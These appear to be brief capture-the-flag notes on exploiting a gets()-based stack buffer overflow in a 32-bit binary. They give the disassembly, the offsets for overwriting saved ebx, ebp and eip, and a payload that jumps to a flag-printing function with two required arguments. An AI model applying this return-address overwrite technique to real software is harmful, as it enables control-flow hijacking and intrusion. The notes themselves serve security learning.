we have a vuln function that uses gets

0x08049272 <+0>:     push   ebp
0x08049273 <+1>:     mov    ebp,esp
0x08049275 <+3>:     push   ebx
0x08049276 <+4>:     sub    esp,0xb4

stack buffer size is 180
we have to overwrite the pushed ebx, ebp then eip

we will jump to flag function at 0x080491e2

here it opens the flag.txt and prints it

but before that it check is the function is passed with to parameters

cmp    DWORD PTR [ebp+0x8],0xdeadbeef

cmp    DWORD PTR [ebp+0xc],0xc0ded00d

so we pass them in right to left

eip = p32(0x80491e2)
ret = p32(0x08049080)
second = p32(0xdeadbeef)
first = p32(0xc0ded00d)

pay = junk + ebx + ebp + eip + ret + second + first + b"\n"

optionally to exit quitly we will jump to exit() function to pass that ret address there
